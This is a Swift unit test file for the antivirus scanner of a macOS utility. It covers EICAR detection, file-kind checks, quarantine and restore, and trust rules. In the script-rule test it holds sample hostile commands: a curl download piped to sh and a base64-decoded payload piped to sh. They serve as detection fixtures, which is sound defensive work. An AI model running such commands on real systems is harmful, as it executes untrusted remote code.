import XCTest
@testable import PureMac

final class AntivirusTests: XCTestCase {
    private var folder: URL!

    override func setUpWithError() throws {
        folder = FileManager.default.temporaryDirectory.appendingPathComponent("AntivirusTests-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
    }

    override func tearDownWithError() throws {
        _ = Shell.run("/bin/chmod", ["-R", "u+rwx", folder.path])
        try? FileManager.default.removeItem(at: folder)
    }

    private func scanner() -> AntivirusScanner {
        AntivirusScanner(home: folder.path, quarantineFolder: folder.appendingPathComponent("Quarantine").path)
    }

    private func customScan(_ urls: [URL], trust: [TrustRule] = []) async -> AntivirusScanOutcome {
        await scanner().scan(mode: .custom, custom: urls, trust: .init(rules: trust), cache: [:]) { _ in }
    }

    // MARK: Rules

    func testEICARRequiresTheExactFile() {
        let eicar = AntivirusRules.eicar
        XCTAssertTrue(AntivirusRules.isEICAR(eicar, fileSize: Int64(eicar.count)))
        let padded = eicar + Data("  \n".utf8)
        XCTAssertTrue(AntivirusRules.isEICAR(padded, fileSize: Int64(padded.count)))
        // The string inside a larger script is not the test file.
        let embedded = Data("echo '".utf8) + eicar + Data("'".utf8)
        XCTAssertFalse(AntivirusRules.isEICAR(embedded, fileSize: Int64(embedded.count)))
        let trailing = eicar + Data("x".utf8)
        XCTAssertFalse(AntivirusRules.isEICAR(trailing, fileSize: Int64(trailing.count)))
    }

    func testFileKinds() {
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0])), .machO)
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2])), .machO)
        // A Java class file shares the universal-binary magic.
        XCTAssertEqual(AntivirusRules.kind(of: Data([0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52])), .other)
        XCTAssertEqual(AntivirusRules.kind(of: Data("#!/bin/sh\n".utf8)), .script)
        XCTAssertEqual(AntivirusRules.kind(of: Data([0x50, 0x4B, 0x03, 0x04])), .zip)
    }

    func testSuspiciousScriptRules() {
        XCTAssertEqual(AntivirusRules.suspiciousScriptRule("curl -s https://x.example/p | sh"), "script.download-exec")
        XCTAssertEqual(AntivirusRules.suspiciousScriptRule("echo aGk= | base64 -d | sh"), "script.base64-exec")
        XCTAssertNil(AntivirusRules.suspiciousScriptRule("curl -O https://example.com/file.zip"))
    }

    func testUnusualProgramLocations() {
        let home = "/Users/test"
        XCTAssertTrue(AntivirusRules.isUnusualProgramLocation("/private/tmp/x", home: home))
        XCTAssertTrue(AntivirusRules.isUnusualProgramLocation("/Users/test/Library/Application Support/.hidden/agent", home: home))
        XCTAssertFalse(AntivirusRules.isUnusualProgramLocation("/Applications/App.app/Contents/MacOS/App", home: home))
        XCTAssertFalse(AntivirusRules.isUnusualProgramLocation("/Users/test/.local/bin/tool", home: home))
    }

    // MARK: Scanner

    func testCustomScanFindsEICARAndLeavesItInPlace() async throws {
        let file = folder.appendingPathComponent("sample.txt")
        try AntivirusRules.eicar.write(to: file)

        let outcome = await customScan([folder])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.rule, "test.eicar")
        XCTAssertEqual(outcome.detections.first?.primary.sha256, "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f")
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path), "A scan must never move files")
    }

    func testCustomScanLooksInsideZipArchives() async throws {
        let inner = folder.appendingPathComponent("payload")
        try FileManager.default.createDirectory(at: inner, withIntermediateDirectories: true)
        try AntivirusRules.eicar.write(to: inner.appendingPathComponent("eicar.com"))
        let zip = folder.appendingPathComponent("archive.zip")
        XCTAssertEqual(Shell.run("/usr/bin/ditto", ["-c", "-k", inner.path, zip.path]).status, 0)
        try FileManager.default.removeItem(at: inner)

        let outcome = await customScan([zip])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.primary.role, .archive)
        XCTAssertEqual(outcome.detections.first?.primary.path, zip.path)
        XCTAssertEqual(outcome.detections.first?.primary.archiveEntry, "eicar.com")
    }

    func testTrustedHashIsSkipped() async throws {
        let file = folder.appendingPathComponent("eicar.com")
        try AntivirusRules.eicar.write(to: file)
        let rule = TrustRule(kind: .hash, value: "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", label: "test", addedAt: Date())

        let outcome = await customScan([file], trust: [rule])

        XCTAssertTrue(outcome.detections.isEmpty)
    }

    func testAdwareAppBundleIsReportedAsOneThreat() async throws {
        let app = folder.appendingPathComponent("Pirrit Helper.app/Contents/MacOS", isDirectory: true)
        try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
        try Data("x".utf8).write(to: app.appendingPathComponent("helper"))

        let outcome = await customScan([folder])

        XCTAssertEqual(outcome.detections.count, 1)
        XCTAssertEqual(outcome.detections.first?.category, .adware)
        XCTAssertEqual(outcome.detections.first?.primary.role, .appBundle)
    }

    // MARK: Quarantine

    func testQuarantineAndRestoreKeepContentAndPermissions() throws {
        let file = folder.appendingPathComponent("script.sh")
        try Data("#!/bin/sh\necho hi\n".utf8).write(to: file)
        XCTAssertEqual(chmod(file.path, 0o750), 0)
        let detection = Detection(
            id: UUID(), name: "Test", category: .script, severity: .suspicious, source: .scriptContent, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 18)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let vault = folder.appendingPathComponent("Quarantine/\(detection.id.uuidString)")

        let items = try AntivirusVault.quarantine(detection, into: vault).get()

        XCTAssertFalse(FileManager.default.fileExists(atPath: file.path))
        XCTAssertEqual(items.count, 1)
        let locked = try FileManager.default.attributesOfItem(atPath: items[0].storedPath)[.posixPermissions] as? NSNumber
        XCTAssertEqual(locked?.intValue, 0, "Quarantined files are locked")

        try AntivirusVault.restore(items).get()

        XCTAssertEqual(try String(contentsOf: file, encoding: .utf8), "#!/bin/sh\necho hi\n")
        let restored = try FileManager.default.attributesOfItem(atPath: file.path)[.posixPermissions] as? NSNumber
        XCTAssertEqual(restored?.intValue, 0o750)
    }

    func testRestoreRefusesToOverwrite() throws {
        let file = folder.appendingPathComponent("a.txt")
        try Data("one".utf8).write(to: file)
        let detection = Detection(
            id: UUID(), name: "Test", category: .testFile, severity: .high, source: .testSignature, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 3)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let items = try AntivirusVault.quarantine(detection, into: folder.appendingPathComponent("Q")).get()
        try Data("two".utf8).write(to: file)

        XCTAssertThrowsError(try AntivirusVault.restore(items).get())
        XCTAssertEqual(try String(contentsOf: file, encoding: .utf8), "two")
    }

    func testDeleteRemovesTheVault() throws {
        let file = folder.appendingPathComponent("b.txt")
        try Data("x".utf8).write(to: file)
        let detection = Detection(
            id: UUID(), name: "Test", category: .testFile, severity: .high, source: .testSignature, rule: "test",
            reason: "", components: [ThreatComponent(path: file.path, role: .file, sha256: nil, size: 1)],
            signing: nil, detectedAt: Date(), mode: .custom
        )
        let vault = folder.appendingPathComponent("V")
        let items = try AntivirusVault.quarantine(detection, into: vault).get()

        try AntivirusVault.delete(vault, items: items).get()

        XCTAssertFalse(FileManager.default.fileExists(atPath: vault.path))
    }

    // MARK: Store

    @MainActor
    func testStoreKeepsDetectionsPendingUntilTheUserActs() async throws {
        let store = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        let file = folder.appendingPathComponent("eicar.com")
        try AntivirusRules.eicar.write(to: file)

        store.start(.custom, custom: [file])
        while store.isScanning { try await Task.sleep(nanoseconds: 50_000_000) }

        XCTAssertEqual(store.pending.count, 1)
        XCTAssertTrue(store.quarantine.isEmpty)
        XCTAssertTrue(FileManager.default.fileExists(atPath: file.path))

        store.trust(store.pending[0], by: .hash)
        XCTAssertTrue(store.pending.isEmpty)
        XCTAssertEqual(store.trusted.first?.kind, .hash)

        // Saved state survives a new store.
        let reloaded = AntivirusStore(folder: folder.appendingPathComponent("Store"))
        XCTAssertEqual(reloaded.trusted.count, 1)
        XCTAssertEqual(reloaded.history.count, 1)
    }
}
